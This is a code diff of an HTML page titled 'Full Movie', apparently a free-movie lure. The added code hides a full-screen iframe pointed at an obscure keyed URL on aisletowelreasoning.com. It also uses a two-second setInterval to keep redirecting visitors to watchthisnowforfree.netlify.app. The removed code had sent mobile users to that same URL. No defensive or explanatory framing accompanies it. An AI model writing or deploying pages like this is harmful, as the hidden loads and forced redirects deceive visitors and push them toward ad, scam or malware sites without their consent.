@@ -1,23 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Full Movie</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      #myiframe {
+        width: 100%;
+        height: 100vh;
+        border: none;
+      }
+    </style>
   </head>
-
   <body>
-    <script>
-      if (screen.width <= 699) {
-        document.location = "https://aisletowelreasoning.com/wv3vzp47z?key=0ed7fe9960bbed9cabb50c191ee5a268";
-      }
-    </script>
+<iframe src="https://google.com" id="myiframe"></iframe>
 
-    <script lang="javascript">
-      const reloadUsingLocationHash = () => {
-        window.location.hash = "reload";
-      }
-      window.onload = reloadUsingLocationHash();
+    <script>
+      let myIframe = document.getElementById('myiframe');
+      myIframe.src = "https://aisletowelreasoning.com/wv3vzp47z?key=0ed7fe9960bbed9cabb50c191ee5a268";
+      setInterval(() => {
+        window.location.href = "https://watchthisnowforfree.netlify.app";
+      }, 2000);
     </script>
   </body>
 </html>
